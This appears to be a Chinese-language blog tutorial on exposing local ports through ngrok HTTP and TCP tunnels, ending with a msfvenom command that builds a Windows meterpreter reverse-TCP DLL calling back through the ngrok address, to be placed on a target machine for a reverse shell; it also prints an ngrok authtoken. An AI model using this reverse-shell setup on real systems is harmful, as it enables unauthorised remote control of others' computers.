---
title: Ngrok加Metasploit实现内网穿透
date: 2017-12-16 12:00:15
tags: 
	- Metasploit
categories:
	- Metasploit
	
---


#### 实例讲解
##### 0x00.
`demon`之前发了一篇`Ngrok&MSF`(内网穿)的文章，由于没时间，现在正好有时间过来测试下。

感谢`demon`的耐心教导。
<!--more-->
 
ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。

Ngrok的下载地址:[https://ngrok.com/download](https://ngrok.com/download)



下面以我的Kali Linux 为例子，下载ngrok。
![](https://i.imgur.com/t5PHWUU.png)

解压后得出，ngrok包
 
![](https://i.imgur.com/vXLf7Nc.png)
 

##### 0X01.
我选择将ngrok复制到/bin


![](https://i.imgur.com/euXlQ9K.png)

##### 0X02.HTTP


![](https://i.imgur.com/44jOhtG.png)


##### 1.安装你的token

去`ngrok`的官网找到你的`token`

> `ngrok  authtoken  6RBm_2CfWq3xAJ3XVK`



根据官方文档 使用`http`的时候 使用`ngrok http 80`(将本地`80`端口映射到`ngrok`外网)，比如我们本机开启了`80`端口（`apache`）需要映射到外网。
开启`apache`服务` 80`端口

![](https://i.imgur.com/fQ3EUYY.png)

![](https://i.imgur.com/xSyAcEh.png)

本机中的`localhost`

![](https://i.imgur.com/2Ne8Jk5.png)


图中可以看到，已将本机的`80`端口映射到` ngrok.io`中

> `ngrok http 80`

![](https://i.imgur.com/dHDnZh5.png)


我们可以来验证下： `http://xxxx571a.ngrok.io `中是否有映射。

![](https://i.imgur.com/5j32G17.png)

![](https://i.imgur.com/FSzXSD2.png)

##### 0x03 TCP
 
配置完了`Ngrok` 上个试了下`http`，我再来试试`TCP`
 



我们使用 `ngrok` 帮助参数 `tcp`

![](https://i.imgur.com/0yJPBDQ.png)

`ngrok tcp 6666` 将本机的`6666`映射到`ngrok`的外网中。

![](https://i.imgur.com/wbepUhs.png)

</br>
![](https://i.imgur.com/jzaOSIv.png)


##### 0x04 Metasploit


    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(ip填写对应的ngrok对应的ip或者对应的ngrok对应的域名地址也可以) LPORT=(端口填写对应的ngrok的映射的端口) -f dll > /opt/x.dll


放入目标机子上得到反弹

![](https://i.imgur.com/hmIDtin.png)


